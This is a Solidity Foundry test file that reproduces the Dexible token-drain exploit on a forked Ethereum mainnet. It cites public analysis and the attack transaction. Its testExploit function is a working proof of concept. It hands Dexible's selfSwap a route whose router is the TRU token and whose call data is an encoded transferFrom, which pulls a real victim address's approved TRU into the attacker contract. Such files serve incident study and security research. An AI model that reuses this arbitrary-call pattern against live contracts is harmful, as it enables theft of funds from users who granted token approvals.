// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1626493024879673344
// @TX
// https://etherscan.io/tx/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6
// https://twitter.com/MevRefund/status/1626450002254958592

library TokenTypes {
    struct TokenAmount {
        uint112 amount;
        address token;
    }
}

library SwapTypes {
    struct RouterRequest {
        address router;
        address spender;
        TokenTypes.TokenAmount routeAmount;
        bytes routerData;
    }

    struct SelfSwap {
        address feeToken;
        TokenTypes.TokenAmount tokenIn;
        TokenTypes.TokenAmount tokenOut;
        RouterRequest[] routes;
    }
}

interface IDexible {
    function selfSwap(SwapTypes.SelfSwap calldata request) external;
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 TRU = IERC20(0x4C19596f5aAfF459fA38B0f7eD92F11AE6543784);
    IDexible Dexible = IDexible(0xDE62E1b0edAa55aAc5ffBE21984D321706418024);
    address victim = 0x58f5F0684C381fCFC203D77B2BbA468eBb29B098;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_646_022);
        cheats.label(address(USDC), "USDC");
        cheats.label(address(TRU), "TRU");
        cheats.label(address(Dexible), "Dexible");
    }

    function testExploit() external {
        deal(address(USDC), address(this), 15 * 1e6);
        USDC.approve(address(Dexible), type(uint256).max);
        uint256 transferAmount = TRU.balanceOf(victim);
        if (TRU.allowance(victim, address(Dexible)) < transferAmount) {
            transferAmount = TRU.allowance(victim, address(Dexible));
        }
        bytes memory callDatas =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), transferAmount);
        TokenTypes.TokenAmount memory routeAmounts = TokenTypes.TokenAmount({amount: 0, token: address(TRU)});
        TokenTypes.TokenAmount memory tokenIns = TokenTypes.TokenAmount({amount: 14_403_789, token: address(USDC)});
        TokenTypes.TokenAmount memory tokenOuts = TokenTypes.TokenAmount({amount: 0, token: address(USDC)});
        SwapTypes.RouterRequest[] memory route = new SwapTypes.RouterRequest[](1);
        route[0] = SwapTypes.RouterRequest({
            router: address(TRU),
            spender: address(Dexible),
            routeAmount: routeAmounts,
            routerData: callDatas
        });
        SwapTypes.SelfSwap memory requests =
            SwapTypes.SelfSwap({feeToken: address(USDC), tokenIn: tokenIns, tokenOut: tokenOuts, routes: route});
        Dexible.selfSwap(requests);

        emit log_named_decimal_uint("Attacker TRU balance after exploit", TRU.balanceOf(address(this)), TRU.decimals());
    }
}
